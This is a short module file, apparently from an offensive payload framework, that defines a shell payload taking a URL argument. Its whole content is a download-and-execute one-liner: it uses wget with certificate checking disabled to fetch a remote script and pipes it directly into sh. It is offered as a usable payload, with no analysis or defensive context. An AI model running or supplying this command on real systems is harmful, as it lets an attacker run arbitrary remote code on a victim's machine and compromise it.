USAGE = 'url'
NARGS = [1, 1]
LANG = 'sh'
EXEC = 'PAYLOAD'

pl = '''
wget -qO- --no-check-certificate ARG1|sh
'''
